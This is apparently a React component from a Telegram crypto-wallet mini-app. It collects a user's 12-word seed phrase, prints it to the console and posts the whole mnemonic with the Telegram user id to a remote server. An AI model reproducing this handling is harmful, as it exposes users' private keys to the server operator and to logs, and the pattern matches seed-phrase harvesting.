import React, { useCallback, useEffect, useState } from "react";
import ListInput from "./components/ListContainer/ListInput";
import cl from "./components/One/One.module.scss";
import { CSSTransition } from "react-transition-group";
import ErrorBlock from "./components/ErrorBlock/ErrorBlock";
import { useNavigate } from "react-router-dom";
import MainButton from "../../constants/MainButton";
import BackButton from "../../constants/BackButton";
import axios from "axios";
import { useDispatch } from "react-redux";
import { fetchUserInfo } from "../../store/telegramUserInfo";
import pagesHistory from "../../constants/pagesHistory";
import Text from "../../components/Text/Text";
import translation from "../../functions/translate";
const WalletInit = () => {
    const [inputs, setInputs] = useState(Array.from({length : 12} , () => ""))
    const [show , setShow] = useState(false)
    const navigate = useNavigate()
    const dispatch = useDispatch()


    useEffect( () => {
      MainButton.show()
      return () => {
        MainButton.hide()
      }
    }, [] )
    // const buttonClick = useCallback( async () => {
    //     const phrase = await navigator.clipboard.readText()
    //     .then(text => 
    //       text
    //     )
    //     .catch(err => {
    //       console.error('Failed to read clipboard contents: ', err);
    //     });
        
    //     const phraseArray = phrase.split(' ')
    //     const newArr = []
    //     for (let i = 0;i < 12; i++){
    //         if (i < phraseArray.length){
    //             newArr.push(phraseArray[i])
    //         }
    //         else{
    //             newArr.push('')
    //         }
    //     }
    //     setInputs(newArr)
        
    // } , [] )
    console.log();

    useEffect(  () => {
        function backFucntion(){
            navigate(-1)
        }

        MainButton.setText(translation("Войти в кошелек"))
        BackButton.onClick(backFucntion)
        return () => {
            BackButton.offClick(backFucntion)
        }
    }, [navigate])

    useEffect( () => {
      pagesHistory.push('/WalletInit')
    } , [] )

    useEffect( () => {
      const menu = document.documentElement.querySelector(".FirstMenu");
      menu.style.display = "none"
      return () => {
        menu.style.display = "flex"
      }
    } , [] )


    const checkWallet = useCallback( async () => {
        MainButton.showProgress()
        console.log('====================================');
        console.log(inputs.map((e,i) => e.trim()));
        console.log('====================================');
        try{
            
            await axios.post("https://www.connectbirga.ru/user/wallet", {
                mnemonic: inputs.map((e,i) => e.trim()),
                userId: window.Telegram.WebApp.initDataUnsafe.user.id,
              } , {
                headers : {
                  "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
                }
              });
              dispatch(fetchUserInfo()).then(value => navigate('/Wallet'))
              
        }
        catch(e){
            window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
            console.log('====================================');
            console.log(e);
            console.log('====================================');
            setShow((value) => !value)
        }
        MainButton.hideProgress()
    } , [inputs, dispatch, navigate]  )

    useEffect( () => {

        MainButton.onClick(checkWallet)
        return () => {

            MainButton.offClick(checkWallet)
        }
    } , [checkWallet] )
    
    const setSomeInput = useCallback((value, index) => {
        setInputs((val) => ([...val].map((e,i) => index === i ? value.toLowerCase() : e.toLowerCase())))
    } , [setInputs] )
    const clearAll = useCallback( () => {
        setInputs(Array.from({length : 12} , () => ""))
    } , [setInputs] )


  return (
    <>
    <div className={[cl.container, cl.padding].join(' ')}>
      <h2 className={cl.title}>{translation("Войти в кошелек")}</h2>

      <Text className={cl.topText}>
        Вставьте сид фразу вашего кошелька, чтобы использовать его в приложении
      </Text>

      {/* <CreateButton onClick={buttonClick} className={cl.WalletInitCreateButton}>
        <div className={cl.buttonContainer}>
          <Text>Вставить фразу</Text>
          <svg
            width="16"
            height="20"
            viewBox="0 0 16 20"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M0.164062 16.9164C0.164062 18.479 0.970205 19.2855 2.51051 19.2855H9.24756C10.7879 19.2855 11.594 18.4718 11.594 16.9164V15.5843H12.8176C14.3579 15.5843 15.1641 14.7706 15.1641 13.2152V3.32843C15.1641 1.76584 14.3579 0.952148 12.8176 0.952148H6.08057C4.54026 0.952148 3.73412 1.76584 3.73412 3.32843V4.65338H2.51051C0.970205 4.65338 0.164062 5.46707 0.164062 7.02966V16.9164ZM7.26099 3.0836V2.91798C7.26099 2.70195 7.41934 2.45712 7.75044 2.45712H11.1406C11.4788 2.45712 11.63 2.70195 11.63 2.91798V3.0836C11.63 3.32122 11.4644 3.53725 11.1406 3.53725H7.75044C7.43374 3.53725 7.26099 3.32122 7.26099 3.0836ZM1.5964 16.8228V7.12327C1.5964 6.45359 1.94189 6.09355 2.63287 6.09355H9.118C9.81617 6.09355 10.1617 6.45359 10.1617 7.12327V16.8228C10.1617 17.4853 9.81617 17.8525 9.118 17.8525H2.63287C1.94189 17.8525 1.5964 17.4853 1.5964 16.8228ZM2.79122 11.9694C2.79122 12.2791 3.00715 12.5023 3.30226 12.5023H6.15255L7.39055 12.4519L6.69957 13.0136L6.01579 13.6688C5.91502 13.7552 5.85744 13.8777 5.85744 14.0217C5.85744 14.3097 6.05898 14.5185 6.33969 14.5185C6.48364 14.5185 6.5988 14.4681 6.69957 14.3745L8.70053 12.3943C8.83009 12.2719 8.90207 12.1423 8.90207 11.9694C8.90207 11.811 8.83729 11.6886 8.70053 11.5518L6.69957 9.57155C6.5988 9.47074 6.48364 9.42753 6.33969 9.42753C6.05898 9.42753 5.85744 9.63636 5.85744 9.91719C5.85744 10.0612 5.92222 10.1908 6.01579 10.2772L6.69237 10.9325L7.38335 11.4942L6.15255 11.4438H3.30226C3.00715 11.4438 2.79122 11.667 2.79122 11.9694Z"
              fill="white"
            />
          </svg>
        </div>
      </CreateButton> */}

      <ListInput setSomeInput = {setSomeInput} inputs={inputs} inputClassName={cl.listInputItem} className={cl.listInput} />
      <Text onClick={clearAll} className={cl.resetAll}>Очистить всё</Text>
    </div>
    <CSSTransition classNames = "errorModal" in = {show} timeout={3000}  >
        <ErrorBlock />
    </CSSTransition>
    </>
  );
};

export default WalletInit;
